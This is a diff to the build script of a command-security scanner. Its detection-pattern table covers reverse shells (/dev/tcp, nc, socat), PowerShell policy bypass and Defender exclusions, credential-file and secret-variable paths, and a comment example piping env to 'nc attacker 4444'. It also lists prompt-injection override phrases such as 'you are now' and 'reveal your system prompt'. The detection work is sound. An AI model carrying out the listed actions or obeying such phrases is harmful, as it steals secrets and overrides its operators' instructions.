@@ -28,8 +28,6 @@ struct CredPattern {
     #[allow(dead_code)]
     regex: String,
     #[allow(dead_code)]
-    redact_prefix_len: Option<usize>,
-    #[allow(dead_code)]
     severity: String,
 }
 
@@ -49,8 +47,7 @@ struct PrivKeyPattern {
 fn main() {
     let out_dir = env::var("OUT_DIR").unwrap();
     let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
-    // Data files live under the crate directory so they are included in the
-    // crate tarball and `cargo publish` / `cargo install` work correctly.
+    // Data files live under the crate dir so they ship in the crate tarball.
     let data_dir = Path::new(&manifest_dir).join("assets").join("data");
 
     compile_confusables(&data_dir, &out_dir);
@@ -259,8 +256,8 @@ fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
             );
         }
         let canonical = parts[1];
-        // Validate: canonical values with alphabetic chars must be lowercase
-        // (comparison pipeline lowercases input, so uppercase canonicals are dead code)
+        // Canonicals must be lowercase — the comparison pipeline lowercases input,
+        // so an uppercase canonical would be dead code.
         if canonical.chars().any(|c| c.is_ascii_uppercase()) {
             panic!(
                 "ocr_confusions.tsv:{}: canonical value {:?} contains uppercase — \
@@ -272,8 +269,8 @@ fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
         entries.push((parts[0].to_string(), canonical.to_string()));
     }
 
-    // Sort by confusable length descending (multi-char first for longest-match)
-    entries.sort_by(|a, b| b.0.len().cmp(&a.0.len()));
+    // Sort by confusable length descending (multi-char first, for longest-match).
+    entries.sort_by_key(|e| std::cmp::Reverse(e.0.len()));
 
     let mut code = String::new();
     code.push_str("/// Auto-generated OCR confusion table.\n");
@@ -298,17 +295,12 @@ fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
     fs::write(&out_path, code).unwrap();
 }
 
-/// Declarative pattern table for Tier 1 / Tier 3 extraction.
+/// Declarative pattern table for Tier 1 / Tier 3 extraction. build.rs assembles
+/// the exec-time and paste-time regexes from these fragments at compile time.
 ///
-/// Each entry has:
-/// - id: human-readable extractor name
-/// - tier1_exec_fragments: regex fragments that trigger Tier 1 for exec context
-/// - tier1_paste_fragments: regex fragments that trigger Tier 1 for paste context (exec + extras)
-/// - notes: documentation
-///
-/// INVARIANT: Any Tier 3 extraction path MUST have a corresponding Tier 1 fragment here.
-/// A missing fragment means the extractor can silently miss input — a security bug.
-/// build.rs assembles exec-time and paste-time regexes from these fragments at compile time.
+/// INVARIANT: any Tier 3 extraction path MUST have a corresponding Tier 1
+/// fragment here — a missing fragment lets the extractor silently miss input (a
+/// security bug).
 struct PatternEntry {
     id: &'static str,
     tier1_exec_fragments: &'static [&'static str],
@@ -338,9 +330,14 @@ const PATTERN_TABLE: &[PatternEntry] = &[
     },
     PatternEntry {
         id: "docker_command",
-        tier1_exec_fragments: &[r"(?:docker|podman)\s+(pull|run|build|create|compose|image)"],
+        // Admit the standalone runtime token, then let `rules::container` parse
+        // global options and the eventual subcommand. Matching only an
+        // immediately adjacent subcommand made commands such as
+        // `docker --context prod run --privileged ...` invisible to the full
+        // rule pass.
+        tier1_exec_fragments: &[r"\b(?:docker|podman)\b"],
         tier1_paste_only_fragments: &[],
-        notes: "Docker/Podman commands that reference images",
+        notes: "Docker/Podman commands, including global-option forms",
     },
     PatternEntry {
         id: "pipe_to_interpreter",
@@ -379,6 +376,32 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         tier1_exec_fragments: &[r"(?i:Invoke-Expression)"],
         tier1_paste_only_fragments: &[],
         notes: "PowerShell Invoke-Expression (iex) full name",
+    },
+    PatternEntry {
+        id: "ps_set_execution_policy",
+        tier1_exec_fragments: &[
+            r"(?i:Set-ExecutionPolicy)\b",
+            // PowerShell accepts every unambiguous `-ex...` prefix of
+            // `-ExecutionPolicy`. Keep tier 1 a conservative superset; tier 3
+            // performs the exact prefix and value validation.
+            r"(?i)-(?:ep|ex[a-z]*)(?:\b|[:=])",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "PowerShell Set-ExecutionPolicy Bypass — cmdlet form and powershell.exe unambiguous -ExecutionPolicy prefixes / -ep alias",
+    },
+    PatternEntry {
+        id: "ps_defender_exclusion",
+        tier1_exec_fragments: &[r"(?i:Add-MpPreference)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "PowerShell Add-MpPreference -ExclusionPath/-ExclusionProcess/-ExclusionExtension — Defender exclusion",
+    },
+    PatternEntry {
+        id: "ps_iex_inline",
+        // `[\s(]` accepts both `iex (iwr …)` and `iex(iwr …)` while requiring a
+        // real command boundary (`\b` would also match `iex2 …`).
+        tier1_exec_fragments: &[r"(?i:iex)[\s(]"],
+        tier1_paste_only_fragments: &[],
+        notes: "PowerShell iex as leading command (inline download-execute form)",
     },
     PatternEntry {
         id: "curl",
@@ -465,6 +488,62 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         notes: "Base64 decode-and-execute patterns (pipe chain, inline, PowerShell)",
     },
     PatternEntry {
+        id: "reverse_shell",
+        // PR3 — shell-level reverse/bind shells. `/dev/tcp` `/dev/udp` are bash
+        // net pseudo-devices (only used for back-connects); the `nc`/`socat` tokens
+        // gate the precise exec-flag / EXEC: match in `check_reverse_shell`.
+        tier1_exec_fragments: &[
+            r"/dev/tcp/",
+            r"/dev/udp/",
+            r"(?i:\b(?:nc|ncat|netcat)(?:\.exe)?\b)",
+            r"(?i:\bsocat(?:\.exe)?\b)",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "Reverse/bind shell shapes (/dev/tcp, nc -e, socat EXEC:) — PR3",
+    },
+    PatternEntry {
+        id: "interpreter_inline_exec",
+        // PR3 — the suspicious-payload markers an inline interpreter body carries.
+        // These survive interpreter quoting/pathing (they live in the -c/-e body),
+        // unlike an `interpreter\s+-c` gate, so they are the robust superset of
+        // `check_interpreter_suspicious_inline_exec`. Call-paren / dotted / `::`
+        // anchored so they match code syntax, not a bare shell word (`eval x`,
+        // `systemctl` do not match).
+        tier1_exec_fragments: &[
+            r"\bexec\s*\(",
+            r"\beval\s*\(",
+            r"\bsystem\s*\(",
+            r"\bpopen\s*\(",
+            r"\bFunction\s*\(",
+            r"os\.(?:system|popen|exec|spawn)",
+            r"\bsubprocess\b",
+            r"__import__\s*\(",
+            r"\bpty\.spawn\b",
+            r"\bshell_exec\s*\(",
+            r"\bpassthru\s*\(",
+            r"\bproc_open\s*\(",
+            r"\bchild_process\b",
+            r"\bexecSync\s*\(",
+            r"\bspawn(?:Sync)?\s*\(",
+            r"\bsocket\.socket\b",
+            r"\burllib\b",
+            r"\burlopen\b",
+            r"\brequests\.(?:get|post|put|patch|delete|request|Session)\b",
+            r"\bhttp\.client\b",
+            r"\bhttplib\b",
+            r"\bIO::Socket\b",
+            r"\bNet::",
+            r"\bLWP::",
+            // PHP function names are case-insensitive. Keep this scoped to the
+            // PHP-capable primitives rather than changing other languages'
+            // case semantics in the precise rule.
+            r"(?i:\b(?:system|popen|shell_exec|passthru|proc_open)\s*\()",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "Inline-interpreter suspicious payload markers (python -c/node -e/... \
+                with exec/subprocess/network) — PR3",
+    },
+    PatternEntry {
         id: "cargo_vet",
         tier1_exec_fragments: &[r"\bcargo\b"],
         tier1_paste_only_fragments: &[],
@@ -473,16 +552,65 @@ const PATTERN_TABLE: &[PatternEntry] = &[
     PatternEntry {
         id: "package_install",
         tier1_exec_fragments: &[
-            r"(?:pip3?|uv)\s+install\b",
-            r"(?:npm|npx|yarn|pnpm|bun)\s+(?:install|i|add)\b",
-            r"npx\s",
-            r"gem\s+install\b",
-            r"go\s+(?:get|install)\b",
-            r"composer\s+require\b",
-            r"dotnet\s+add\b",
+            r"(?i:\b(?:pip3?|uv)(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+install\b)",
+            // `(?:[^\s;|&]+\s+){0,3}` mirrors `npm_command::MAX_SUBCOMMAND_PREFIX_WORDS`:
+            // the subcommand is not always the first word after the launcher
+            // (`yarn global add`, `yarn workspace <name> add`, `yarn
+            // --network-timeout 100000 add`), and a fragment that demands
+            // adjacency gates those forms out of exec context entirely.
+            r"(?i:\b(?:npm|npx|yarn|pnpm|bun)(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:[^\s;|&]+\s+){0,3}(?:install|i|add|ci|clean-install)\b)",
+            // npm's historical install misspellings and the install-test
+            // family. They install exactly as `install` does, so without them
+            // one extra keystroke buys an unanalyzed install.
+            r"(?i:\bnpm(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:[^\s;|&]+\s+){0,3}(?:in|ins|inst|insta|instal|isnt|isnta|isntal|isntall|ic|install-clean|isntall-clean|install-test|it|install-ci-test|cit|clean-install-test|sit)\b)",
+            r"(?i:\bnpx(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s)",
+            // The fetch-and-run half of the npm family (`crate::npm_command`).
+            // Every form the shared grammar recognizes needs a fragment here or
+            // it is gated out of exec context and never reaches tier 3.
+            r"(?i:\bnpm(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:[^\s;|&]+\s+){0,3}(?:exec|x)\b)",
+            r"(?i:\bpnpm(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:[^\s;|&]+\s+){0,3}dlx\b)",
+            r"(?i:\byarn(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:[^\s;|&]+\s+){0,3}dlx\b)",
+            r"(?i:\bbun(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:[^\s;|&]+\s+){0,3}x\b)",
+            r"(?i:\bbunx(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s)",
+            r"(?i:\bpnpx(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s)",
+            r"(?i:\bgem(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+install\b)",
+            r"(?i:\bgo(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+(?:get|install)\b)",
+            r"(?i:\bcomposer(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+require\b)",
+            r"(?i:\bdotnet(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+add\b)",
+            r"(?i:\b(?:mvnw?|gradlew?)(?:\.exe|\.cmd|\.bat|\.com|\.ps1)?['\x22]?\s+)",
         ],
         tier1_paste_only_fragments: &[],
         notes: "Package manager install commands — trigger threat DB lookup",
+    },
+    PatternEntry {
+        id: "install_command",
+        tier1_exec_fragments: &[
+            // Tier-1 gate only; the install-command rules tokenize subcommands/flags.
+            r"\b(?:apt|apt-get|aptitude)\s+(?:install|update|upgrade|add-repository)\b",
+            r"\bdnf\s+(?:install|upgrade|update)\b",
+            r"\b(?:yum|zypper)\s+install\b",
+            r"\bpacman\s+-[A-Za-z]*S",
+            r"\b(?:yay|paru|trizen)\s",
+            r"\bbrew\s+(?:install|tap|reinstall)\b",
+            r"\bkubectl\s+(?:apply|create|replace)\b",
+            r"\bhelm\s+(?:install|upgrade|repo)\b",
+            r"\bterraform\s+(?:init|get)\b",
+            // High-risk markers that can appear without the tool name on the line.
+            r"sources\.list",
+            r"add-apt-repository\b",
+            r"\[trusted=yes\]",
+            r"--allow-unauthenticated\b",
+            r"--allow-insecure-repositories\b",
+            r"--allow-downgrades-to-insecure-repositories\b",
+            r"--nogpgcheck\b",
+            r"(?i:--no-gpg-checks\b)",
+            r"(?i:(?:APT::Get::AllowUnauthenticated|Acquire::Allow(?:InsecureRepositories|DowngradeToInsecureRepositories|WeakRepositories))\b)",
+            r"(?i)gpgcheck\s*=\s*0",
+            r"(?i)SigLevel\s*=\s*Never",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "Package-manager / infrastructure install commands and their \
+                high-risk markers (unsigned repos, disabled GPG checks, remote manifests)",
     },
     PatternEntry {
         id: "env_var_dangerous",
@@ -508,7 +636,10 @@ const PATTERN_TABLE: &[PatternEntry] = &[
     PatternEntry {
         id: "env_var_sensitive",
         tier1_exec_fragments: &[
-            r"(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY|GITHUB_TOKEN)\s*=",
+            // Coarse superset of the central sensitive-assets registry. Precise
+            // value-aware RPC and prefix-family classification stays in tier 3.
+            r"(?i:(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|AWS_SECURITY_TOKEN|AWS_WEB_IDENTITY_TOKEN_FILE|AWS_CONTAINER_AUTHORIZATION_TOKEN(?:_FILE)?|AZURE_CLIENT_SECRET|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_API_KEY|GOOGLE_OAUTH_ACCESS_TOKEN|GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|NODE_AUTH_TOKEN|PYPI_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY|STRIPE_API_KEY|DOCKER_PASSWORD|DOCKER_CONFIG|KUBECONFIG|SLACK_TOKEN|SSH_AUTH_SOCK|GPG_AGENT_INFO|PRIVATE_KEY|DEPLOYER_PRIVATE_KEY|WALLET_PRIVATE_KEY|ETH_PRIVATE_KEY|EVM_PRIVATE_KEY|FOUNDRY_PRIVATE_KEY|MNEMONIC|SEED_PHRASE|WALLET_MNEMONIC|SOLANA_KEYPAIR(?:_PATH)?|ANCHOR_WALLET|KEYSTORE_PASSWORD|WALLET_PASSWORD|UV_INDEX_URL|PIP_INDEX_URL|PIP_EXTRA_INDEX_URL|TWINE_PASSWORD|TWINE_TOKEN|RPC_API_KEY|JWT_SECRET|RPC_URL|ETH_RPC_URL|SOLANA_RPC_URL|AWS_SECRET_[A-Z0-9_]+|AWS_SESSION_TOKEN_[A-Z0-9_]+|AWS_SECURITY_TOKEN_[A-Z0-9_]+|AZURE_CLIENT_SECRET_[A-Z0-9_]+|GOOGLE_API_KEY_[A-Z0-9_]+|GOOGLE_OAUTH_ACCESS_TOKEN_[A-Z0-9_]+|TWINE_PASSWORD_[A-Z0-9_]+|TWINE_TOKEN_[A-Z0-9_]+))\s*=",
+            r"(?i:(?:--mnemonic\b|\b(?:mnemonic|seed[-_ ]?phrase)\s*[:=]))",
         ],
         tier1_paste_only_fragments: &[],
         notes: "Sensitive API key environment variable exports",
@@ -547,21 +678,34 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         notes: "Docker/Podman remote daemon with privilege escalation",
     },
     PatternEntry {
+        // C10 — one COARSE gate for the Web3 tool family. Tier-1 only has to
+        // decide whether the precise parser is worth running, so matching the
+        // bare tool token is correct and cheap; `rules::web3` then discards
+        // every benign `cast call` / `forge build` without emitting anything.
+        // Anchored on a word boundary so `forgets` and `castle` do not match.
+        id: "web3_cli",
+        tier1_exec_fragments: &[r"\b(?:cast|forge|hardhat|solana|anchor)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "Web3 tool invocations (cast, forge, hardhat, solana, anchor); precise grammar in rules::web3 decides what is actually state-changing",
+    },
+    PatternEntry {
         id: "credential_file_sweep",
         tier1_exec_fragments: &[
-            r"\.ssh/id_",
-            r"\.ssh/authorized_keys",
-            r"\.aws/credentials",
-            r"\.aws/config",
-            r"\.docker/config\.json",
-            r"\.kube/config",
-            r"\.config/gcloud/",
+            r"(?:^|[\\/])\.ssh(?:[\\/]|\b)",
+            r"(?:^|[\\/])\.aws(?:[\\/]|\b)",
+            r"(?:^|[\\/])\.azure(?:[\\/]|\b)",
+            r"(?:^|[\\/])\.docker(?:[\\/]|\b)",
+            r"(?:^|[\\/])\.kube(?:[\\/]|\b)",
+            r"(?:^|[\\/])\.config[\\/](?:gcloud|gh|solana)(?:[\\/]|\b)",
             r"\.npmrc",
             r"\.pypirc",
             r"\.netrc",
-            r"\.gnupg/",
-            r"\.config/gh/",
+            r"(?:^|[\\/])\.gnupg(?:[\\/]|\b)",
             r"\.git-credentials",
+            r"(?:^|[\\/])\.ethereum[\\/]keystore(?:[\\/]|\b)",
+            r"(?:^|[\\/])wallet\.dat(?:\b|[\s'\x22])",
+            r"(?:^|[\\/])(?:solana-keypair|-?[^\\/\s]+-keypair)\.json(?:\b|[\s'\x22])",
+            r"(?:^|[\\/])etc(?:[\\/]|\b)",
         ],
         tier1_paste_only_fragments: &[],
         notes: "Credential file path sweep (multiple sensitive paths in one command)",
@@ -572,6 +716,128 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         tier1_paste_only_fragments: &[r"[^\x00-\x7F]"],
         notes:
             "Non-ASCII bytes in pasted content (analysis trigger only, never sole reason to WARN)",
+    },
+    PatternEntry {
+        id: "cloud_cli",
+        // M8 ch1 — coarse tier-1 probe for cloud/k8s CLIs; the precise
+        // destructive-verb match lives in `rules::context::check`. `aws-vault` is
+        // listed because `aws-vault exec … -- aws s3 rm …` is the same shape with a
+        // credential wrapper. `\b` keeps `aws-` / `azimuth` out of the hit list.
+        tier1_exec_fragments: &[
+            r"\b(?:kubectl|oc|kustomize|helm|argocd|aws|aws-vault|gcloud|az)\b",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "Cloud / k8s CLIs for production-context destructive-command detection (M8 ch1)",
+    },
+    PatternEntry {
+        id: "ssh_cmd",
+        // M8 ch2 — coarse tier-1 probe for `ssh`; the precise destructive-verb +
+        // host-label match lives in `rules::ssh_context::check`. `\b` keeps `sshd`,
+        // `sshpass`, `_ssh` out — only the standalone `ssh` token matches.
+        tier1_exec_fragments: &[r"\bssh\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "SSH invocations for remote-session destructive-command detection (M8 ch2)",
+    },
+    PatternEntry {
+        id: "iac_cmd",
+        // M8 ch3 — coarse tier-1 probe for IaC CLIs; precise apply/destroy/
+        // -auto-approve matching lives in `rules::iac::check`. `\b` keeps
+        // `terraformer`, `pulumictl`, `tofu-config` out of the hit list.
+        tier1_exec_fragments: &[r"\b(?:terraform|pulumi|tofu)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "IaC CLIs for apply-gate / destroy detection (M8 ch3)",
+    },
+    PatternEntry {
+        id: "docker_exec",
+        // Kept as an explicit coverage declaration even though the broader
+        // `docker_command` admission above also reaches this sink.
+        tier1_exec_fragments: &[r"(?:docker|podman)\s+exec"],
+        tier1_paste_only_fragments: &[],
+        notes: "Docker / Podman exec subcommand for prod-container detection (M8 ch5)",
+    },
+    PatternEntry {
+        id: "sudo_cmd",
+        // M8 ch4 — coarse tier-1 probe for `sudo`; the precise matching lives in
+        // `rules::sudo::check`. `\b` keeps `sudoers` / `pseudo-` out. Catches
+        // direct `sudo …` invocations the pipe-to-interpreter regex misses (e.g.
+        // `sudo sh`, `sudo tee /etc/foo`).
+        tier1_exec_fragments: &[r"\bsudo\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "Sudo invocations for escalation-gate detection (M8 ch4)",
+    },
+    PatternEntry {
+        id: "env_to_network_sink",
+        // M9 ch4 — tier-1 ticket for the no-URL `env | nc attacker 4444` shape
+        // (`env | curl https://x` already passes via `standard_url`). The precise
+        // check lives in `env_guard::check_printenv_to_network_sink`; `\b` keeps
+        // `printenvironment` / `environment` out.
+        tier1_exec_fragments: &[r"\b(?:printenv|env)\b\s*\|"],
+        tier1_paste_only_fragments: &[],
+        notes: "printenv/env piped to a network sink (M9 ch4)",
+    },
+    PatternEntry {
+        id: "destructive_fs_op",
+        // M10 ch1 — coarse tier-1 probe for destructive fs ops; the precise match
+        // lives in the cheap, filesystem-free `blast_radius::cheap_check` (hot
+        // path). The full filesystem-walking `blast_radius::simulate` runs ONLY
+        // under `tirith preview`, never the hot path (see `engine::analyze`). `\b`
+        // keeps `charm`/`firmware` out; the cheap check re-verifies the leader, so
+        // a coarse hit on `mv` in prose is harmless.
+        tier1_exec_fragments: &[r"\b(?:rm|mv|chmod|find|rsync)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "Destructive filesystem ops for blast-radius cheap check (M10 ch1)",
+    },
+    PatternEntry {
+        id: "prompt_injection_seed",
+        // M7 ch5 — coarse paste-only gate for the prompt-injection rule; the
+        // precise regex lives in `rules::prompt_injection`. Kept `paste_only` (not
+        // `exec`) so the exec hot path isn't tripped by `git ignore-revs` or
+        // `# disregard this commit`. FileScan and the output pipeline reach the
+        // rule independently of this row; it stays explicit for the safeguard test.
+        tier1_exec_fragments: &[],
+        tier1_paste_only_fragments: &[
+            r"(?i)\bignore\b",
+            r"(?i)\bdisregard\b",
+            r"(?i)\bforget\b",
+            r"(?i)\boverride\b",
+            r"(?i)\bact\s+as\b",
+            r"(?i)\byou\s+are\s+now\b",
+            r"(?i)\bsystem\s*:",
+            r"(?i)\bDAN\s+mode\b",
+            r"(?i)\bdo\s+anything\s+now\b",
+            r"(?i)\bnew\s+instructions\s*:",
+            r"(?i)\bfrom\s+now\s+on\b",
+            // OWASP LLM01 (M7 ch5): standalone chat-template / role-override
+            // delimiters. Coarse, low-FP literal gates so the precise seeds in
+            // `rules::prompt_injection` are tier-1-reachable in the Paste context.
+            r"\[INST\]",
+            r"<\|im_start\|>",
+            r"<\|im_end\|>",
+            r"<<SYS>>",
+            // OWASP LLM01 (M7 ch5): system-prompt-extraction leaders. These mirror
+            // the precise seeds in `rules::prompt_injection` (extraction context
+            // only), so a bare `print(...)`, a JSON `"repeat"`, or "reveal the
+            // answer" in a paste does NOT force tier-3. Each fragment is a SUPERSET
+            // of its seed, so the seed stays Paste-reachable.
+            r"(?i)\breveal (?:your |the |your system |the system |system )?(?:prompt|instructions)\b",
+            r"(?i)\bprint (?:your |the )?(?:system )?(?:prompt|instructions)\b",
+            r"(?i)\brepeat (?:the )?(?:words|text) above\b",
+        ],
+        notes: "Prompt-injection seed phrases — coarse tier-1 gate for the paste context. \
+                The precise multi-word regex lives in `rules::prompt_injection`.",
+    },
+    PatternEntry {
+        id: "command_card_shell_comment",
+        // M11 ch1 — tier-1 ticket for the shell-comment card-reference channel
+        // (`# tirith-card: ./install-card.json` preceding a command); the precise
+        // parse + local-vs-URL classification is in `command_card::find_card_comment`.
+        // The `--card <path>` sidecar is a SEPARATE channel (via `ctx.card_ref`).
+        // v1 has no HTML-comment channel; a URL-shaped value is not fetched on the
+        // hot path (it warns "fetch first").
+        tier1_exec_fragments: &[r"#\s*tirith-card:"],
+        tier1_paste_only_fragments: &[],
+        notes: "Command-card shell-comment reference channel (M11 ch1) — \
+                `# tirith-card: <local-path>` preceding a command.",
     },
 ];
 
@@ -591,7 +857,6 @@ fn generate_tier1_regex(out_dir: &str) {
             paste_fragments.push(frag.to_string());
         }
 
-        // Enforce: every entry must have at least one fragment
         if entry.tier1_exec_fragments.is_empty() && entry.tier1_paste_only_fragments.is_empty() {
             let id = entry.id;
             panic!(
@@ -601,7 +866,6 @@ fn generate_tier1_regex(out_dir: &str) {
         }
     }
 
-    // Load credential patterns from TOML and inject tier-1 entries
     let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
     let cred_path = Path::new(&manifest_dir)
         .join("assets")
@@ -612,11 +876,11 @@ fn generate_tier1_regex(out_dir: &str) {
     let cred_file: CredentialPatternsFile = toml::from_str(&cred_content)
         .unwrap_or_else(|e| panic!("Failed to parse credential_patterns.toml: {e}"));
 
-    // credential_known — exec fragments from all [[pattern]] entries
     {
         let mut known_frags: Vec<String> = Vec::new();
         if let Some(ref patterns) = cred_file.pattern {
             for p in patterns {
+                validate_credential_tier1_fragment(&p.id, &p.tier1_fragment);
                 known_frags.push(p.tier1_fragment.clone());
             }
         }
@@ -631,7 +895,6 @@ fn generate_tier1_regex(out_dir: &str) {
         }
     }
 
-    // credential_private_key — exec fragment from [[private_key_pattern]]
     {
         let pk_patterns = cred_file
             .private_key_pattern
@@ -643,17 +906,16 @@ fn generate_tier1_regex(out_dir: &str) {
         );
         ids.push("credential_private_key".to_string());
         for pk in pk_patterns {
+            validate_credential_tier1_fragment(&pk.id, &pk.tier1_fragment);
             exec_fragments.push(pk.tier1_fragment.clone());
             paste_fragments.push(pk.tier1_fragment.clone());
         }
     }
 
-    // credential_generic — paste-only fragment for generic key=value patterns
     {
-        // Tier-1 must be a superset of GENERIC_SECRET_RE. The runtime regex
-        // allows optional quote/bracket before the operator (["']?\]?), which
-        // cannot contain literal " in the r"..." generated output. We use
-        // .{0,2} as a permissive stand-in for the optional quote+bracket.
+        // Tier-1 must be a superset of GENERIC_SECRET_RE. `.{0,2}` is a permissive
+        // stand-in for the runtime regex's optional quote/bracket before the
+        // operator (a literal `"` can't appear in the generated `r"..."`).
         let generic_frag = r"(?i:key|token|secret|password)\w*.{0,2}\s*(?:[:=]|:=|=>|<-|>)";
         ids.push("credential_generic".to_string());
         paste_fragments.push(generic_frag.to_string());
@@ -661,6 +923,10 @@ fn generate_tier1_regex(out_dir: &str) {
 
     let exec_regex = format!("(?:{})", exec_fragments.join("|"));
     let paste_regex = format!("(?:{})", paste_fragments.join("|"));
+    regex::Regex::new(&exec_regex)
+        .unwrap_or_else(|error| panic!("generated Tier-1 exec regex is invalid: {error}"));
+    regex::Regex::new(&paste_regex)
+        .unwrap_or_else(|error| panic!("generated Tier-1 paste regex is invalid: {error}"));
 
     let mut code = String::new();
     code.push_str("// Auto-generated Tier 1 regex patterns from declarative pattern table.\n");
@@ -680,7 +946,6 @@ fn generate_tier1_regex(out_dir: &str) {
         "pub const TIER1_PASTE_FRAGMENT_COUNT: usize = {paste_count};\n",
     ));
 
-    // Generate extractor IDs array
     code.push_str("\npub const EXTRACTOR_IDS: &[&str] = &[\n");
     for id in &ids {
         code.push_str(&format!("    \"{id}\",\n"));
@@ -691,16 +956,15 @@ fn generate_tier1_regex(out_dir: &str) {
     fs::write(&out_path, code).unwrap();
 }
 
-// ---------------------------------------------------------------------------
-// Rule explanations
-// ---------------------------------------------------------------------------
+fn validate_credential_tier1_fragment(id: &str, fragment: &str) {
+    regex::Regex::new(fragment).unwrap_or_else(|error| {
+        panic!("credential_patterns.toml entry '{id}' has an invalid tier1_fragment: {error}")
+    });
+}
 
-/// (snake_case id, PascalCase enum variant) for every RuleId in verdict.rs.
-/// build.rs uses snake_case for TOML validation, PascalCase for generating
-/// the mitre_id match function.
-///
-/// SYNC: must match `enum RuleId` in src/verdict.rs exactly.
-/// The `test_all_rule_ids_have_explanation` test catches drift at CI time.
+/// (snake_case id, PascalCase variant) for every RuleId — snake for TOML
+/// validation, Pascal for the mitre_id match. Must match `enum RuleId` in
+/// src/verdict.rs exactly; `test_all_rule_ids_have_explanation` catches drift.
 const EXPECTED_RULES: &[(&str, &str)] = &[
     // Hostname
     ("non_ascii_hostname", "NonAsciiHostname"),
@@ -747,6 +1011,19 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("credential_file_sweep", "CredentialFileSweep"),
     ("base64_decode_execute", "Base64DecodeExecute"),
     ("data_exfiltration", "DataExfiltration"),
+    ("wrapper_chain_too_deep", "WrapperChainTooDeep"),
+    (
+        "ps_set_execution_policy_bypass",
+        "PsSetExecutionPolicyBypass",
+    ),
+    ("ps_defender_exclusion", "PsDefenderExclusion"),
+    ("ps_inline_download_execute", "PsInlineDownloadExecute"),
+    // PR3 — LOTL command rules
+    ("reverse_shell", "ReverseShell"),
+    (
+        "interpreter_suspicious_inline_exec",
+        "InterpreterSuspiciousInlineExec",
+    ),
     // Code file scan
     ("dynamic_code_execution", "DynamicCodeExecution"),
     ("obfuscated_payload", "ObfuscatedPayload"),
@@ -772,6 +1049,7 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("mcp_duplicate_server_name", "McpDuplicateServerName"),
     ("mcp_overly_permissive", "McpOverlyPermissive"),
     ("mcp_suspicious_args", "McpSuspiciousArgs"),
+    ("mcp_server_drift", "McpServerDrift"),
     // Ecosystem
     ("git_typosquat", "GitTyposquat"),
     ("docker_untrusted_registry", "DockerUntrustedRegistry"),
@@ -780,21 +1058,89 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("web3_rpc_endpoint", "Web3RpcEndpoint"),
     ("web3_address_in_url", "Web3AddressInUrl"),
     ("vet_not_configured", "VetNotConfigured"),
-    // Threat intelligence — Phase A (local DB)
+    // Install-command rules
+    ("repo_add_from_pipe", "RepoAddFromPipe"),
+    ("unsigned_repo_trust", "UnsignedRepoTrust"),
+    ("gpg_check_disabled", "GpgCheckDisabled"),
+    ("kubectl_apply_remote", "KubectlApplyRemote"),
+    ("helm_untrusted_repo", "HelmUntrustedRepo"),
+    ("terraform_remote_module", "TerraformRemoteModule"),
+    ("brew_untrusted_tap", "BrewUntrustedTap"),
+    // CI / repo supply-chain scan rules
+    ("workflow_unpinned_action", "WorkflowUnpinnedAction"),
+    ("workflow_dangerous_trigger", "WorkflowDangerousTrigger"),
+    ("workflow_curl_pipe_shell", "WorkflowCurlPipeShell"),
+    ("workflow_untrusted_input", "WorkflowUntrustedInput"),
+    (
+        "workflow_excessive_permissions",
+        "WorkflowExcessivePermissions",
+    ),
+    ("workflow_run_trigger", "WorkflowRunTrigger"),
+    (
+        "workflow_checkout_untrusted_ref",
+        "WorkflowCheckoutUntrustedRef",
+    ),
+    ("workflow_cache_poisoning", "WorkflowCachePoisoning"),
+    ("workflow_artifact_poisoning", "WorkflowArtifactPoisoning"),
+    ("dockerfile_unpinned_image", "DockerfileUnpinnedImage"),
+    ("package_script_dangerous", "PackageScriptDangerous"),
+    // AI-relevant file hidden-content scan rules
+    ("notebook_hidden_content", "NotebookHiddenContent"),
+    ("notebook_suspicious_output", "NotebookSuspiciousOutput"),
+    ("agent_instruction_hidden", "AgentInstructionHidden"),
+    ("svg_script_embedded", "SvgScriptEmbedded"),
+    ("svg_external_reference", "SvgExternalReference"),
